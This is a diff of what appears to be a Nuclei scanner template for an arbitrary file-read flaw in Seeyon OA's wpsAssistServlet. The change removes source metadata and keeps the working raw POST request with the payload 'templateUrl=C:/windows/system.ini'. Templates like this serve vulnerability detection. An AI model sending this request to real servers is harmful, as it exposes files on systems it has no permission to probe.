@@ -3,14 +3,8 @@ info:
   name: 致远 OA wpsAssistServlet 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lngbx48dqiwdim5t
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lngbx48dqiwdim5t
-    fofa: 暂无
 http:
 - raw:
   - 'POST /seeyon/wpsAssistServlet HTTP/1.1
@@ -20,8 +14,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     flag=template&templateUrl=C:/windows/system.ini
